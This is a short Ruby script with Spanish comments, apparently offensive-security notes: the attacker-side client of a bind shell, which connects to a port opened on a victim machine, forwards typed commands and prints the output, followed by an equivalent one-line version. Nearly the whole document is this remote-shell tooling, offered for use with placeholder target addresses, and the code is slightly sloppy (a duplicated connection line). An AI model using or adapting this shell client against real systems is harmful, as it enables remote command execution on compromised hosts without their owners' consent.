#!/usr/bin/env ruby

  #  bindShell   se ejecuta del atacante hacia la victima, necesita previamente un puerto abierto en la victima

require 'socket'

s = TCPSocket.new("127.0.0.1",9876)   #<=== ("ipTargetHere", portHere)
s = TCPSocket.new("127.0.0.1",9876)

loop do
  cmd = gets.chomp
  s.puts cmd
  s.close if cmd == "exit"
  puts s.recv(10000)
end

# oneLiner
#
::: ruby -rsocket -e 's = TCPSocket.new("ipTargetHere",9876);loop do; cmd = gets.chomp; s.puts cmd; s.close if cmd == "exit"; puts s.recv(10000); end'

#  -rsocket        require 'socket'


